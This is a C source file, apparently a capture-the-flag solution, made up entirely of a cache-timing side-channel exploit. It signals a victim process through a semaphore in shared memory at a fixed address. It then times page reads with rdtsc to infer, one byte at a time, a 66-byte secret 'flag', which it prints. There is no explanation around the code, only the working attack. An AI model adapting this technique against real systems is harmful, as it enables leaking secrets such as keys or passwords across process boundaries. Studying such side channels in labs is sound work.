#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>

char flag[0x100]= {0};
uint64_t time_access_no_flush(void *p)
{
    uint64_t start, end;
    start = _rdtsc();
    volatile uint64_t x = *(volatile uint64_t*)p;
    _mm_mfence();
    end = _rdtsc();
    return end - start;
}
u_char mem(int index)
{
    unsigned long addr = 0x1337000;
    char *ptr = (char*)addr;
    sem_t *sem = (sem_t *)ptr;
    *(int *)(sem + 1) = index;
    sem_post(sem);
    sched_yield();
    usleep(200);
    unsigned long long min_re = -1, re;
    char possible_char;
 
    for (int i = 0x4; i < 0x80; i++)
    {

        re = time_access_no_flush(ptr + (i + 1) * 0x1000);
        //printf("find: %d\tindex: %d\ttime: %llu\n", index, i, re);
        if(re < min_re)
        {
            min_re = re;
            flag[index] = i;
            possible_char = i;
        }
        
    }
    return possible_char;

}

char pos[256];

int main()
{
    
    for (int i = 0; i < 66; i++)
    {
        // memset(pos, 0, sizeof(pos));
        // for (int j = 0; j < 10; j++)
        //     pos[mem(i)]++;
        // int max_index = 0;
        // for (int j = 0; j < 0x80; j++)
        // {
        //     max_index = (pos[j] > pos[max_index])? j : max_index;
        // }
        // flag[i] = max_index;
        mem(i);
    }
    printf("%s\n", flag);
    printf("end\n");
    return 0;
}